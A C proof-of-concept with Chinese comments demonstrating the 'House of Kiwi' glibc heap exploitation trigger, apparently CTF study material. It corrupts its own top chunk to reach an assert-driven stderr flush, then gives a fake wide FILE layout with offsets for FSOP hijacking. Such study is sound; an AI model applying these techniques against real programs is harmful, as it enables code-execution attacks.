#define _GNU_SOURCE
/*
 * House of Kiwi 专属触发器，适用范围是 glibc 2.23～2.35。
 *
 * Kiwi 真正特殊的地方并不是某一种 fake FILE 的最终触发点，而是故意破坏
 * top chunk，让下面这条调用链在 sysmalloc 的断言里被走到：
 *
 *   __malloc_assert -> __fxprintf(NULL, ...) -> fflush(stderr)
 *
 * 这份 PoC 用 fopencookie 提供的真实 write 回调来观察这次 stderr 刷新，
 * 一旦回调被调用就直接 `_exit(0)`。用合法的 cookie API 本身不是漏洞，
 * 只是用来做观察；实际题目里应该把这里换成被覆盖的 stderr,以及
 * Apple/codecvt/obstack 等 FSOP 手法真正的最终触发点。
 *
 * glibc 2.36 把 __malloc_assert 改成走 __libc_message 之后就不再访问
 * stderr 了，同一份程序在 2.36 上会直接 abort，不会进入回调，这是一个
 * 可以直接观察到的失效边界。
 */

#include <assert.h>
#include <malloc.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static ssize_t kiwi_stderr_write(void *cookie, const char *buffer, size_t size)
{
    (void)cookie;
    (void)buffer;
    (void)size;

    /* 只有旧版 __malloc_assert 把缓冲的报错文本 fflush 到这个 cookie 时，
       才会走到这里。 */
    static const char ok[] =
        "[+] __malloc_assert -> fflush(stderr) callback reached\n";
    write(STDOUT_FILENO, ok, sizeof(ok) - 1);
    _exit(0);
}

int main(void)
{
    setbuf(stdout, NULL);

    cookie_io_functions_t io = {
        .read = NULL,
        .write = kiwi_stderr_write,
        .seek = NULL,
        .close = NULL,
    };
    FILE *cookie_stderr = fopencookie(NULL, "w", io);
    assert(cookie_stderr != NULL);

    /* 显式设置一个较大的缓冲区，确保这段短短的断言文本先留在 FILE 内部，
       等源码里那次 `fflush(stderr)` 再把它刷出来；这样可以避免 write 回调
       在 vfprintf 阶段就提前被触发。 */
    static char stderr_buffer[0x1000];
    assert(setvbuf(cookie_stderr, stderr_buffer, _IOFBF,
                   sizeof(stderr_buffer)) == 0);
    stderr = cookie_stderr;

    void *chunk = malloc(0x100);
    assert(chunk != NULL);
    size_t usable = malloc_usable_size(chunk);

    /* `chunk + usable` 恰好落在相邻 top chunk 的 size 字段上。写成 0x21
       既保留了 PREV_INUSE 位，又满足 MINSIZE 的要求，但由此算出的伪造
       old_end 并不满足 page alignment，下一次 sysmalloc 就会触发源码里
       那条 top invariant 断言。 */
    size_t *top_size = (size_t *)((char *)chunk + usable);
    printf("[i] top.size=%#lx→0x21，触发断言\n",
           (unsigned long)*top_size);
    *top_size = 0x21;

    (void)malloc(0x1000);

    /* 如果 malloc 意外正常返回，或者在 2.36+ 上既没有进入回调也没有 abort，
       都不能算作验证成功。 */
    _exit(1);
}

/*
 * ======================== stderr wide FILE 伪代码 ========================
 *
 * 上面这段 C 代码只验证了 Kiwi 专属的触发器：损坏 top 之后，2.23～2.35
 * 上的 `__malloc_assert` 会去刷新 stderr。实际题目里还需要把 stderr 改造
 * 成一个可以被利用的 wide FILE：
 *
 *     wide_vtable_field =
 *         0x130；     // glibc 2.23～2.29 使用这个偏移
 *         0x0f0；     // glibc 2.30 使用这个偏移
 *         0x0e0；     // glibc 2.31～2.35 使用这个偏移
 *
 *     fake_file[0x20] = 0；
 *     fake_file[0x28] = 1；
 *     fake_file[0x88] = 可写锁；
 *     fake_file[0xa0] = fake_wide_data；
 *     fake_file[0xc0] = 0；
 *     fake_file[0xd8] = _IO_wfile_jumps；
 *     fake_wide_data[0x18] = 0；
 *     fake_wide_data[0x30] = 0；
 *     fake_wide_data[wide_vtable_field] = fake_wide_vtable；
 *     fake_wide_vtable[0x68] = 受控 doallocate；
 *
 * 最后再按前面的方式破坏 top，触发本文件验证过的那条 assert 路径。glibc
 * 2.36 起 assert 改走 `__libc_message`，就算 fake FILE 的布局仍然正确，
 * 也没办法再靠 Kiwi 触发它了。
 */
